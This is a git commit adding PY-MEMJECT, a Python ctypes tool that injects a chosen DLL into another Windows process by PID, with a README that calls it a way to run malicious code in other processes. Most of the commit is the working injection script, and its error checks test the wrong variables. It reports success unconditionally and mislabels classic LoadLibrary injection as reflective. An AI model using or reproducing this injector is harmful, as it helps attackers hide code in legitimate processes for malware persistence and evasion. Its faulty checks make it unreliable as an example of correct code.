2a495fab7f21959acba1200da97654dfeadbc904
GREENSHADE <0x445@protonmail.com>
2019-12-16 19:39:25 -0500

    Initial commit

---
+++ PY-MEMJECT.py
@@ -0,0 +1,96 @@
+import sys
+from ctypes import *
+
+def reflective_injection():
+
+    print("\n ---[PY-MEMJECT, Runtime .DLL injection}---\n")
+    
+    dll_name   = sys.argv[1]
+    dll_length = len(dll_name)
+    PID        = sys.argv[2]
+    kernel32   = windll.kernel32
+    
+    if len(sys.argv) < 2:
+        print("[!] Usage: ./PY-MEMJECT calc32.dll <PID>")
+        sys.exit(1)
+    
+    print("[+] Current selected .DLL payload: %s" %dll_name)
+    print("[+] Current selected process PID: %s" %PID)
+
+    # Runtime - Windows API functions process
+    # OpenProcess() --> Injector attaches to host process
+    #       |---> VirtualAllocEx() --> Memory allocates for host process
+    #             |--->WriteProcessMemory() --> Copy DLL to host process
+    #                  |--->CreateRemoteThread() --> Code execution
+
+    PAGE_READWRITE = 0x04
+    PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
+    VIRTUAL_MEM = ( 0x1000 | 0x2000 )
+    
+    dwDesiredAccess  = PROCESS_ALL_ACCESS
+    bInheritHandle   = False
+    dwProcessId      = int(PID)
+    # opens the process object via OpenProcess()
+    loading_process = kernel32.OpenProcess(dwDesiredAccess,
+                                           bInheritHandle,
+                                           dwProcessId)
+    if not loading_process:
+        print("[!] Error attaching to the process: %s" %dwProcessId)
+    else:
+        print("[+] Attached to the process: %s" %dwProcessId)
+        
+    hProcess         = loading_process
+    lpAddress        = 0
+    dwSize           = dll_length
+    flAllocationType = VIRTUAL_MEM
+    flProtect        = PAGE_READWRITE
+    # Allocates memory for the host process
+    allocate_memory = kernel32.VirtualAllocEx(hProcess,
+                                              lpAddress,
+                                              dwSize,
+                                              flAllocationType,
+                                              flProtect)
+    if not loading_process:
+        print("[!] Host process memory allocation failed")
+    else:
+        print("[+] Host process memory allocation sucess")
+        
+    written = c_int(0)
+    hProcess         = loading_process
+    lpBaseAddress    = allocate_memory
+    lpBuffer         = dll_name
+    nSize            = dll_length
+    lpNumberOfBytesWritten = written
+    # Copies the .DLL to the host process
+    write_memory = kernel32.WriteProcessMemory(hProcess,
+                                               lpBaseAddress,
+                                               lpBuffer,
+                                               nSize,
+                                               lpNumberOfBytesWritten)
+    if not loading_process:
+        print("[!] Failed to copy .DLL into host process")
+    else:
+        print("[+] Successfully copied .DLL into host process")
+        
+    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
+    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
+    
+    thread_id = c_ulong(0)
+    hProcess            = loading_process
+    lpThreadAttributes  = None
+    dwStackSize         = 0
+    lpStartAddress      = h_loadlib
+    lpParameter         = allocate_memory
+    dwCreationFlags     = 0
+    lpThreadId          = byref(thread_id)
+    code_execution = kernel32.CreateRemoteThread(hProcess,
+                                                 lpThreadAttributes,
+                                                 dwStackSize,
+                                                 lpStartAddress,
+                                                 lpParameter,
+                                                 dwCreationFlags,
+                                                 lpThreadId)
+    print("[+] Successful injection into PID: %s" %PID)
+    
+if __name__ == '__main__':
+    reflective_injection()
---
+++ README.md
@@ -0,0 +1,41 @@
+![logo](images/pylogo.png)
+##### PY-MEMJECT: A Windows runtime .DLL injection tool that allows for malicious code to run in another processes memory
+![tweet](https://img.shields.io/twitter/url?url=https%3A%2F%2Fgithub.com%2FSHADEGREEN%2FPY-MEMJECT%2Ftree%2Fmaster)
+[![](https://img.shields.io/badge/python-3-yellow.svg?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
+
+----
+
+**Usage:**
+```
+      ./PY-MEMJECT.py <DLL PATH> <process PID>
+```
+
+![pops calculator](https://raw.githubusercontent.com/SHADEGREEN/PY-MEMJECT/master/images/success.png)
+
+----
+
+**About:**
+```
+Windows API functions process goes as follows:
+
+     OpenProcess() --> Injector attaches to host process
+           |---> VirtualAllocEx() --> Memory allocates for host process
+                 |---> WriteProcessMemory() --> Copy DLL to host process
+                      |---> CreateRemoteThread() --> Code execution
+
+```
+
+*Preface:* There are a couple of types of DLL injection, this utilizes the "Runtime" injection method, which is a legitimate Win32API usage, using only Win32API functions we can inject malicious.DLL code into other running processes. DLL injection is a very common behavior of malware, with about 40% of malware having the capability to inject itself or other malicious code into running processes, usually to establish persistence on a system. DLL injection is also commonly found in video game cheating, where a user can inject a cheat menu into the game.
+
+*Breaking down the Windows API functions:* There are four main steps to injecting a DLL payload into a running processes. The steps are simply to first attach and set up a handler to a running process which will allow us to communicate with it. Secondly you will allocate a space in memory in the host (victim) process that you are injecting. Thirdly, you will inject and copy the .DLL payload into that host processes allocated space. And finally is this all works out, you will get code execution through the victim program.
+
+![image of process](https://raw.githubusercontent.com/SHADEGREEN/PY-MEMJECT/master/images/Dll-injection-createremotethread.png)
+
+   1. **OpenProcess()** The full documentation from [Microsoft](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess). Basically it is responsible for setting up access to a process object and returning a handle to us as a means of communication with the process we select.
+   2. **VirtualAllocEx()** The full documentation from [Microsoft](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex). In the context of DLL injection, this function is responsible for allocating memory space in the victim process. 
+   3. **WriteProcessMemory()** The full documentation from [Microsoft](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory). Like the function name states, this function is simply responsible for writing the malicious DLL data to the area of memory that has been allocated with the previous step. 
+   4. **CreateRemoteThread()** The full documentation from [Microsoft](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread). After connecting to the victim program, allocating and writing data to the host process, CreateRemoteThread creates a thread in the virtual address space of the host process. 
+
+### Disclaimer
+>This tool is only for testing and academic purposes and can only be used where strict consent has been given. Do not use it for illegal purposes! It is the end user’s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this tool and software in general.
+
